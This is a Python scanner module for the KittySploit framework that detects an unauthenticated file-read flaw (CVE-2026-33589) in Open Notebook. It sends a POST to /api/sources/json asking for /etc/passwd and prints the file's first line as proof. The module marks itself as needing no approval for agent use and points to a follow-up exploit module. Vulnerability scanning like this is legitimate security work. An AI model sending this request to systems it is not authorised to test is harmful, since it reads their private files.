#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect Open Notebook CVE-2026-33589 unauthenticated LFI via file_path."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Open Notebook CVE-2026-33589 LFI Detect",
        "description": (
            "Detects CVE-2026-33589 in Open Notebook <= 1.8.3: POST /api/sources/json accepts "
            "type=upload with an unsanitized file_path, allowing arbitrary file read when "
            "OPEN_NOTEBOOK_PASSWORD is unset."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-33589"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33589",
            "https://www.cve.org/CVERecord?id=CVE-2026-33589",
        ],
        "modules": ["auxiliary/admin/http/open_notebook_cve_2026_33589_lfi"],
        "tags": [
            "web",
            "scanner",
            "open-notebook",
            "lfi",
            "path-traversal",
            "cve-2026-33589",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "endpoint_pattern_any": ["/api/sources/json"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_read", "from_detail": "file_path LFI"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/open_notebook_cve_2026_33589_lfi",
                ],
            },
        },
    }

    port = OptPort(5055, "Open Notebook HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    auth_token = OptString(
        "",
        "Bearer token when OPEN_NOTEBOOK_PASSWORD is set on the target",
        False,
        advanced=True,
    )

    def run(self):
        base = (self.path or "/").rstrip("/")
        endpoint = f"{base}/api/sources/json" if base else "/api/sources/json"
        headers = {"Content-Type": "application/json"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"

        try:
            response = self.http_request(
                method="POST",
                path=endpoint,
                json={"type": "upload", "file_path": "/etc/passwd"},
                headers=headers,
                timeout=max(int(self.timeout or 15), 30),
            )
        except Exception as exc:
            print_status(f"CVE-2026-33589 probe failed: {exc.__class__.__name__}")
            return False

        if not response:
            return False
        if response.status_code == 401:
            print_status("CVE-2026-33589 probe blocked by authentication (401)")
            return False
        if response.status_code == 400:
            body, _ = parse_json_response(response)
            detail = ""
            if body:
                detail = str(body.get("detail") or "")
            else:
                detail = (response.text or "")[:120]
            if "uploads directory" in detail or "Invalid file path" in detail:
                return False
        if response.status_code != 200:
            return False

        body, err = parse_json_response(response)
        if err or not body:
            return False
        full_text = body.get("full_text") or ""
        if not full_text:
            return False

        first_line = full_text.splitlines()[0] if full_text.splitlines() else full_text[:80]
        reason = f"CVE-2026-33589: /etc/passwd read — {first_line[:120]}"
        print_status("CVE-2026-33589 vuln=True")
        self.set_info(
            severity="high",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-33589",
            path=endpoint,
        )
        return True
